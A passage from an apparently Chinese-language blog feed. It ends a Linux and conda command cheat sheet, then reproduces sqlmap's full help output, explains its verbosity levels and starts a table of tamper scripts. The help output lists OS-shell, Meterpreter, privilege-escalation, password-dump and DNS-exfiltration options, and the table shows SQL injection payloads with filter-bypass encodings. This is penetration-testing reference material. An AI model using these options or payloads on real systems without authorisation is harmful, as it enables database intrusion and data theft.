查看网络上的主机是否工作</span><br><span class="line">netstat             显示网络连接、路由表和网络接口信息</span><br><span class="line">nc(netcat)          建立</span><br><span class="line">TCP 和 UDP 连接并监听</span><br><span class="line">su                  切换当前用户身份到其他用户身份</span><br><span class="line">touch [file]        创建新的空文件</span><br><span class="line">mkdir [dir]         创建目录</span><br><span class="line">chmod               变更文件或目录的权限</span><br><span class="line">chown               变更某个文件或目录的所有者和所属组</span><br><span class="line">nano / vim / emacs  字符终端的文本编辑器</span><br><span class="line"><span class="built_in">exit</span>                退出</span><br><span class="line">shell</span><br><span class="line">管道命令符 <span class="string">"|"</span>       将一个命令的标准输出作为另一个命令的标准输入</span><br></pre></td></tr></table></figure><h2 id="解压缩命令"><a href="#解压缩命令" class="headerlink" title="解压缩命令"></a>解压缩命令</h2><p>linux下最常用的打包程序就是tar了，使用tar程序打出来的包我们常称为tar包，tar包文件的命令通常都是以.tar结尾的。生成tar包后，就可以用其它的程序来进行压缩。</p><h3 id="1．命令格式："><a href="#1．命令格式：" class="headerlink" title="1．命令格式："></a>1．命令格式：</h3><p>tar[必要参数][选择参数][文件]</p><h3 id="2．命令功能："><a href="#2．命令功能：" class="headerlink" title="2．命令功能："></a>2．命令功能：</h3><p>用来压缩和解压文件。tar本身不具有压缩功能。他是调用压缩功能实现的</p><h3 id="3．命令参数："><a href="#3．命令参数：" class="headerlink" title="3．命令参数："></a>3．命令参数：</h3><p>必要参数有如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-A 新增压缩文件到已存在的压缩</span><br><span class="line">-B 设置区块大小</span><br><span class="line">-c 建立新的压缩文件</span><br><span class="line">-d 记录文件的差别</span><br><span class="line">-r 添加文件到已经压缩的文件</span><br><span class="line">-u 添加改变了和现有的文件到已经存在的压缩文件</span><br><span class="line">-x 从压缩的文件中提取文件</span><br><span class="line">-t 显示压缩文件的内容</span><br><span class="line">-z 支持gzip解压文件</span><br><span class="line">-j 支持bzip2解压文件</span><br><span class="line">-Z 支持compress解压文件</span><br><span class="line">-v 显示操作过程</span><br><span class="line">-l 文件系统边界设置</span><br><span class="line">-k 保留原有文件不覆盖</span><br><span class="line">-m 保留文件不被覆盖</span><br><span class="line">-W 确认压缩文件的正确性</span><br><span class="line">可选参数如下：</span><br><span class="line">-b 设置区块数目</span><br><span class="line">-C 切换到指定目录（是相对路径）</span><br><span class="line">-f 指定压缩文件</span><br><span class="line">--<span class="built_in">help</span> 显示帮助信息</span><br><span class="line">--version 显示版本信息</span><br></pre></td></tr></table></figure><h3 id="4．常见解压-压缩命令"><a href="#4．常见解压-压缩命令" class="headerlink" title="4．常见解压/压缩命令"></a>4．常见解压/压缩命令</h3><p>tar<br>解包：tar xvf FileName.tar<br>打包：tar cvf FileName.tar DirName<br>（注：tar是打包，不是压缩！）<br>.gz<br>解压1：gunzip FileName.gz<br>解压2：gzip -d FileName.gz<br>压缩：gzip FileName<br>.tar.gz 和 .tgz<br>解压：tar zxvf FileName.tar.gz<br>压缩：tar zcvf FileName.tar.gz DirName<br>.bz2<br>解压1：bzip2 -d FileName.bz2<br>解压2：bunzip2 FileName.bz2<br>压缩： bzip2 -z FileName<br>.tar.bz2<br>解压：tar jxvf FileName.tar.bz2<br>压缩：tar jcvf FileName.tar.bz2 DirName<br>.bz<br>解压1：bzip2 -d FileName.bz<br>解压2：bunzip2 FileName.bz<br>压缩：未知<br>.tar.bz<br>解压：tar jxvf FileName.tar.bz<br>压缩：未知<br>.Z<br>解压：uncompress FileName.Z<br>压缩：compress FileName<br>.tar.Z<br>解压：tar Zxvf FileName.tar.Z<br>压缩：tar Zcvf FileName.tar.Z DirName<br>.zip<br>解压：unzip FileName.zip<br>压缩：zip FileName.zip DirName<br>.rar<br>解压：rar x FileName.rar<br>压缩：rar a FileName.rar DirName</p><h3 id="5．使用实例"><a href="#5．使用实例" class="headerlink" title="5．使用实例"></a>5．使用实例</h3><p>实例1：将文件全部打包成tar包<br>命令：<br>tar -cvf log.tar log2012.log<br>tar -zcvf log.tar.gz log2012.log<br>tar -jcvf log.tar.bz2 log2012.log</p><h2 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h2><pre><code>var=value         给变量var赋值value$var, ${var}      取变量的值`cmd`, $(cmd)     代换标准输出'string'          非替换字符串"string"          可替换字符串$ var="test";$ echo $vartest$ echo 'This is a $var';This is a $var$ echo "This is a $var";This is a test$ echo `date`;2017年 11月 06日 星期一 14:40:07 CST$ $(bash)$ echo $0/bin/bash$ $($0)</code></pre><h2 id="Bash-快捷键"><a href="#Bash-快捷键" class="headerlink" title="Bash 快捷键"></a>Bash 快捷键</h2><pre><code>Up(Down)          上（下）一条指令Ctrl + c          终止当前进程Ctrl + z          挂起当前进程，使用“fg”可唤醒Ctrl + d          删除光标处的字符Ctrl + l          清屏Ctrl + a          移动到命令行首Ctrl + e          移动到命令行尾Ctrl + b          按单词后移（向左）Ctrl + f          按单词前移（向右）Ctrl + Shift + c  复制Ctrl + Shift + v  粘贴</code></pre><h1 id="Linux的文本编辑器"><a href="#Linux的文本编辑器" class="headerlink" title="Linux的文本编辑器"></a>Linux的文本编辑器</h1><p>#Linux系统的启动过程</p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="进程相关ID"><a href="#进程相关ID" class="headerlink" title="进程相关ID"></a>进程相关ID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">user 用户名</span><br><span class="line">uid 用户号</span><br><span class="line">pid 进程号</span><br><span class="line">ppid 父进程号</span><br><span class="line">size 内存大小, Kbytes字节.</span><br><span class="line">vsize 总虚拟内存大小, bytes字节(包含code+data+stack)</span><br><span class="line">share 总共享页数</span><br><span class="line">nice 进程优先级(缺省为0, 最大为-20)</span><br><span class="line">priority(pri) 内核调度优先级</span><br><span class="line">pmem 进程分享的物理内存数的百分比</span><br><span class="line">trs 程序执行代码驻留大小</span><br><span class="line">rss 进程使用的总物理内存数, Kbytes字节</span><br><span class="line">time 进程执行起到现在总的CPU暂用时间</span><br><span class="line"><span class="built_in">stat</span> 进程状态</span><br><span class="line">cmd(args) 执行命令的简单格式</span><br></pre></td></tr></table></figure><h3 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h3><p>命令后面加&amp;符号可以调入后台，fg [n]，从后台调入前台 ,bg从前台调入后台</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><h2 id="Linux-文档参考"><a href="#Linux-文档参考" class="headerlink" title="Linux 文档参考"></a>Linux 文档参考</h2><p><a href="http://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html" target="_blank">Linux Filesystem Hierarchy</a></p><h2 id="Linux和windows双系统默认项设置（亲测可用）"><a href="#Linux和windows双系统默认项设置（亲测可用）" class="headerlink" title="Linux和windows双系统默认项设置（亲测可用）"></a>Linux和windows双系统默认项设置（亲测可用）</h2><p><a href="https://jingyan.baidu.com/article/c1a3101e608595de656deb0e.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/c1a3101e608595de656deb0e.html</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>附录：cona的简单使用</p><p>conda create -n [name]     #创建名为name的conda环境，如tensorflow<br>1<br>source activate [name]     #激活刚才创建的环境，命令完成后，回答先命令行之前多了刚创建的环境的名字<br>1<br>source deactivate [name]    #退出名为name的环境，回到系统默认环境<br>1<br>conda remove -n [name] –all   #删除刚刚创建的conda环境<br>1<br>conda info -envs    #查看所安装环境列表，创建的环境都在<code>~/anaconda2/envs/</code>目录下面<br>1<br>conda list      #查看已经安装的包<br>1<br>conda install [packagename]        #安装具体的包，加-n [name]可以安装到指定环境<br>1<br>conda list -n [name]      #name环境下安装了哪些包<br>1<br>conda update -n [name] [packagename]     #升级name环境的名为packagename的包<br>1<br>conda remove -n [name] [packagename]     #删除name环境的名为packagename的包</p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqlmap用户手册及实战</title>
      <link href="/2018/08-14-sqlmap.html"/>
      <url>/2018/08-14-sqlmap.html</url>
      <content type="html"><![CDATA[<h1 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h1><p>sqlmap是一个开源的渗透测试工具，可以自动检测和利用SQL注入漏洞并接管数据库服务器。它配备了强大的检测引擎，为终极渗透测试仪提供了许多小众功能，以及从数据库指纹识别，从数据库获取数据到访问底层文件系统以及通过输出操作系统执行命令的各种开关。带连接。</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre><code>Usage: python sqlmap.py [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program's version number and exit  -v VERBOSE            Verbosity level: 0-6 (default 1)  Target:    At least one of these options has to be provided to define the    target(s)    -d DIRECT           Connection string for direct database connection    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file    -m BULKFILE         Scan multiple targets given in a textual file    -r REQUESTFILE      Load HTTP request from a file    -g GOOGLEDORK       Process Google dork results as target URLs    -c CONFIGFILE       Load options from a configuration INI file  Request:    These options can be used to specify how to connect to the target URL    --method=METHOD     Force usage of given HTTP method (e.g. PUT)    --data=DATA         Data string to be sent through POST    --param-del=PARA..  Character used for splitting parameter values    --cookie=COOKIE     HTTP Cookie header value    --cookie-del=COO..  Character used for splitting cookie values    --load-cookies=L..  File containing cookies in Netscape/wget format    --drop-set-cookie   Ignore Set-Cookie header from response    --user-agent=AGENT  HTTP User-Agent header value    --random-agent      Use randomly selected HTTP User-Agent header value    --host=HOST         HTTP Host header value    --referer=REFERER   HTTP Referer header value    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)    --auth-cred=AUTH..  HTTP authentication credentials (name:password)    --auth-file=AUTH..  HTTP authentication PEM cert/private key file    --ignore-code=IG..  Ignore HTTP error code (e.g. 401)    --ignore-proxy      Ignore system default proxy settings    --ignore-redirects  Ignore redirection attempts    --ignore-timeouts   Ignore connection timeouts    --proxy=PROXY       Use a proxy to connect to the target URL    --proxy-cred=PRO..  Proxy authentication credentials (name:password)    --proxy-file=PRO..  Load proxy list from a file    --tor               Use Tor anonymity network    --tor-port=TORPORT  Set Tor proxy port other than default    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))    --check-tor         Check to see if Tor is used properly    --delay=DELAY       Delay in seconds between each HTTP request    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)    --retries=RETRIES   Retries when the connection timeouts (default 3)    --randomize=RPARAM  Randomly change value for given parameter(s)    --safe-url=SAFEURL  URL address to visit frequently during testing    --safe-post=SAFE..  POST data to send to a safe URL    --safe-req=SAFER..  Load safe HTTP request from a file    --safe-freq=SAFE..  Test requests between two visits to a given safe URL    --skip-urlencode    Skip URL encoding of payload data    --csrf-token=CSR..  Parameter used to hold anti-CSRF token    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token    --force-ssl         Force usage of SSL/HTTPS    --hpp               Use HTTP parameter pollution method    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.                        "import hashlib;id2=hashlib.md5(id).hexdigest()")  Optimization:    These options can be used to optimize the performance of sqlmap    -o                  Turn on all optimization switches    --predict-output    Predict common queries output    --keep-alive        Use persistent HTTP(s) connections    --null-connection   Retrieve page length without actual HTTP response body    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)  Injection:    These options can be used to specify which parameters to test for,    provide custom injection payloads and optional tampering scripts    -p TESTPARAMETER    Testable parameter(s)    --skip=SKIP         Skip testing for given parameter(s)    --skip-static       Skip testing parameters that not appear to be dynamic    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")    --dbms=DBMS         Force back-end DBMS to this value    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)    --os=OS             Force back-end DBMS operating system to this value    --invalid-bignum    Use big numbers for invalidating values    --invalid-logical   Use logical operations for invalidating values    --invalid-string    Use random strings for invalidating values    --no-cast           Turn off payload casting mechanism    --no-escape         Turn off string escaping mechanism    --prefix=PREFIX     Injection payload prefix string    --suffix=SUFFIX     Injection payload suffix string    --tamper=TAMPER     Use given script(s) for tampering injection data  Detection:    These options can be used to customize the detection phase    --level=LEVEL       Level of tests to perform (1-5, default 1)    --risk=RISK         Risk of tests to perform (1-3, default 1)    --string=STRING     String to match when query is evaluated to True    --not-string=NOT..  String to match when query is evaluated to False    --regexp=REGEXP     Regexp to match when query is evaluated to True    --code=CODE         HTTP code to match when query is evaluated to True    --text-only         Compare pages based only on the textual content    --titles            Compare pages based only on their titles  Techniques:    These options can be used to tweak testing of specific SQL injection    techniques    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection    --union-char=UCHAR  Character to use for bruteforcing number of columns    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection    --dns-domain=DNS..  Domain name used for DNS exfiltration attack    --second-order=S..  Resulting page URL searched for second-order response  Fingerprint:    -f, --fingerprint   Perform an extensive DBMS version fingerprint  Enumeration:    These options can be used to enumerate the back-end database    management system information, structure and data contained in the    tables. Moreover you can run your own SQL statements    -a, --all           Retrieve everything    -b, --banner        Retrieve DBMS banner    --current-user      Retrieve DBMS current user    --current-db        Retrieve DBMS current database    --hostname          Retrieve DBMS server hostname    --is-dba            Detect if the DBMS current user is DBA    --users             Enumerate DBMS users    --passwords         Enumerate DBMS users password hashes    --privileges        Enumerate DBMS users privileges    --roles             Enumerate DBMS users roles    --dbs               Enumerate DBMS databases    --tables            Enumerate DBMS database tables    --columns           Enumerate DBMS database table columns    --schema            Enumerate DBMS schema    --count             Retrieve number of entries for table(s)    --dump              Dump DBMS database table entries    --dump-all          Dump all DBMS databases tables entries    --search            Search column(s), table(s) and/or database name(s)    --comments          Retrieve DBMS comments    -D DB               DBMS database to enumerate    -T TBL              DBMS database table(s) to enumerate    -C COL              DBMS database table column(s) to enumerate    -X EXCLUDECOL       DBMS database table column(s) to not enumerate    -U USER             DBMS user to enumerate    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables    --pivot-column=P..  Pivot column name    --where=DUMPWHERE   Use WHERE condition while table dumping    --start=LIMITSTART  First dump table entry to retrieve    --stop=LIMITSTOP    Last dump table entry to retrieve    --first=FIRSTCHAR   First query output word character to retrieve    --last=LASTCHAR     Last query output word character to retrieve    --sql-query=QUERY   SQL statement to be executed    --sql-shell         Prompt for an interactive SQL shell    --sql-file=SQLFILE  Execute SQL statements from given file(s)  Brute force:    These options can be used to run brute force checks    --common-tables     Check existence of common tables    --common-columns    Check existence of common columns  User-defined function injection:    These options can be used to create custom user-defined functions    --udf-inject        Inject custom user-defined functions    --shared-lib=SHLIB  Local path of the shared library  File system access:    These options can be used to access the back-end database management    system underlying file system    --file-read=RFILE   Read a file from the back-end DBMS file system    --file-write=WFILE  Write a local file on the back-end DBMS file system    --file-dest=DFILE   Back-end DBMS absolute filepath to write to  Operating system access:    These options can be used to access the back-end database management    system underlying operating system    --os-cmd=OSCMD      Execute an operating system command    --os-shell          Prompt for an interactive operating system shell    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC    --os-bof            Stored procedure buffer overflow exploitation    --priv-esc          Database process user privilege escalation    --msf-path=MSFPATH  Local path where Metasploit Framework is installed    --tmp-path=TMPPATH  Remote absolute path of temporary files directory  Windows registry access:    These options can be used to access the back-end database management    system Windows registry    --reg-read          Read a Windows registry key value    --reg-add           Write a Windows registry key value data    --reg-del           Delete a Windows registry key value    --reg-key=REGKEY    Windows registry key    --reg-value=REGVAL  Windows registry key value    --reg-data=REGDATA  Windows registry key value data    --reg-type=REGTYPE  Windows registry key value type  General:    These options can be used to set some general working parameters    -s SESSIONFILE      Load session from a stored (.sqlite) file    -t TRAFFICFILE      Log all HTTP traffic into a textual file    --batch             Never ask for user input, use the default behaviour    --binary-fields=..  Result fields having binary values (e.g. "digest")    --check-internet    Check Internet connection before assessing the target    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)    --eta               Display for each output the estimated time of arrival    --flush-session     Flush session files for current target    --forms             Parse and test forms on target URL    --fresh-queries     Ignore query results stored in session file    --har=HARFILE       Log all HTTP traffic into a HAR file    --hex               Use DBMS hex function(s) for data retrieval    --output-dir=OUT..  Custom output directory path    --parse-errors      Parse and display DBMS error messages from responses    --save=SAVECONFIG   Save options to a configuration INI file    --scope=SCOPE       Regexp to filter targets from provided proxy log    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)    --update            Update sqlmap  Miscellaneous:    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")    --alert=ALERT       Run host OS command(s) when SQL injection is found    --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")    --beep              Beep on question and/or when SQL injection is found    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables    --dependencies      Check for missing (non-core) sqlmap dependencies    --disable-coloring  Disable console output coloring    --gpage=GOOGLEPAGE  Use Google dork results from specified page number    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection    --mobile            Imitate smartphone through HTTP User-Agent header    --offline           Work in offline mode (only use session data)    --purge-output      Safely remove all content from output directory    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection    --smart             Conduct thorough tests only if positive heuristic(s)    --sqlmap-shell      Prompt for an interactive sqlmap shell    --tmp-dir=TMPDIR    Local directory for storing temporary files    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")    --wizard            Simple wizard interface for beginner users</code></pre><h1 id="Output-verbosity-输出冗长"><a href="#Output-verbosity-输出冗长" class="headerlink" title="Output verbosity(输出冗长)"></a>Output verbosity(输出冗长)</h1><p>选项: <code>-v</code></p><p>此选项可用于设置输出消息的详细级别。存在 <strong>seven</strong> 级别的冗长。默认级别为<strong>1</strong> 其中显示信息，警告，错误，关键消息和Python回溯（如果发生）。</p><ul><li><strong>0</strong>: 仅显示Python回溯，错误和关键消息。</li><li><strong>1</strong>: 还显示信息和警告消息。</li><li><strong>2</strong>: 显示调试消息。</li><li><strong>3</strong>: 显示注入的有效负载。</li><li><strong>4</strong>: 还显示HTTP请求。</li><li><strong>5</strong>: 还显示HTTP响应的标题。</li><li><strong>6</strong>: 还显示HTTP响应的页面内容。</li></ul><p>一个合理的冗长程度，以进一步了解sqlmap在底层的作用是 <strong>2</strong>, 级，主要用于检测阶段和接管功能。而如果您想查看工具发送的SQL有效负载，则第<strong>3</strong>级是您的最佳选择。当您向开发人员提供潜在的错误报告时，也建议使用此级别，确保使用选项生成的流量日志文件与标准输出一起发送<code>-t</code>.。为了进一步调试潜在的错误或意外行为，我们建议您将详细程度设置为 <strong>4</strong>级或更高级别。应该注意的是，还可以通过使用此选项的较短版本来设置详细程度，其中字母数量 <code>v</code> 内的规定开关（而不是选择）确定的详细级别（例如<code>-v</code> ，而不是code>-v 2, <code>-vv</code> 代替<code>-v 3</code>, <code>-vvv</code> 而不是<code>-v 4</code>, etc.)</p># tamper脚本分类说明<div><table style="font-family:Arial;font-size:14px;border-collapse:collapse;"><tbody><tr><td class="et2" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:bottom;width:77.25pt;">支持的数据库</td><td class="et3" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">编号</td><td class="et3" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:166.5pt;">脚本名称</td><td class="et2" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:bottom;width:210.75pt;">作用</td><td class="et2" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:bottom;width:251.25pt;">实现方式</td></tr><tr><td class="et4" rowspan="8" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">all</td><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et6" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">apostrophemask.py</td><td class="et7" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用utf8代替引号</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">("1 AND '1'='1") <br>'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871' </td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">base64encode.py </td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用base64编码替换</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">("1' AND SLEEP(5)#")<br>'MScgQU5EIFNMRUVQKDUpIw=='</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">multiplespaces.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">围绕SQL关键字添加多个空格</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 UNION SELECT foobar')<br>'1    UNION     SELECT   foobar'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2plus.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用+替换空格</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('SELECT id FROM users')<br>'SELECT+id+FROM+users'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">nonrecursivereplacement.py</td><td class="et7" style="font-size:11pt;vertical-align:middle;width:210.75pt;">双重查询语句。取代predefined SQL关键字with表示 <br>suitable for替代（例如  .replace（“SELECT”、”")） filters</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 UNION SELECT 2--')<br>'1 UNIOUNIONN SELESELECTCT 2--'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2randomblank.py</td><td class="et7" style="font-size:11pt;vertical-align:middle;width:210.75pt;">代替空格字符（“”）从一个随机的空<br>白字符可选字符的有效集</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('SELECT id FROM users')<br>'SELECT%0Did%0DFROM%0Ausers'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">unionalltounion.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">替换UNION ALL SELECT UNION SELECT</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('-1 UNION ALL SELECT')<br>'-1 UNION SELECT'</td></tr><tr><td class="et5" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et9" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">securesphere.py</td><td class="et10" style="font-size:11pt;vertical-align:middle;width:210.75pt;">追加特制的字符串</td><td class="et8" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 1=1')<br>"1 AND 1=1 and '0having'='0having'"</td></tr><tr><td class="et4" rowspan="11" style="font-size:20pt;text-align:center;vertical-align:middle;width:77.25pt;">mssql</td><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">1</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2hash.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;"><br>'1 AND 9227=9227' <br>'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227' </td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">2</td><td class="et14" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">equaltolike.py</td><td class="et15" style="font-size:11pt;vertical-align:middle;width:210.75pt;">like 代替等号</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;"><br>* Input: SELECT * FROM users WHERE id=1 <br>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">3</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mssqlblank.py(mssql)</td><td class="et16" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">空格替换为其它空符号</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">Input: SELECT id FROM users<br>Output: SELECT%08id%02FROM%0Fusers</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">4</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">space2mssqlhash.py</td><td class="et16" style="font-size:11pt;vertical-align:bottom;width:210.75pt;">替换空格</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227')<br>'1%23%0AAND%23%0A9227=9227'</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">5</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">between.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">用between替换大于号（&gt;）</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND A &gt; B--')<br>'1 AND A NOT BETWEEN 0 AND B--'</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">6</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">percentage.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">asp允许每个字符前面添加一个%号</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM TABLE<br>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">7</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">sp_password.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">('1 AND 9227=9227-- ')<br>'1 AND 9227=9227-- sp_password'</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">8</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">charencode.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">url编码</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:251.25pt;">* Input: SELECT FIELD FROM%20TABLE<br>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td></tr><tr><td class="et11" style="font-size:11pt;font-weight:700;text-align:center;vertical-align:middle;width:48pt;">9</td><td class="et12" style="font-size:11pt;text-align:center;vertical-align:middle;width:166.5pt;">randomcase.py</td><td class="et13" style="font-size:11pt;vertical-align:middle;width:210.75pt;">随机大小写</td><td class="et17" style="font-size:10.5pt;vertical-align:middle;width:251.25pt;">* Input: INSERT<br>* Output: InsERt</td></tr><tr><td class="et11" 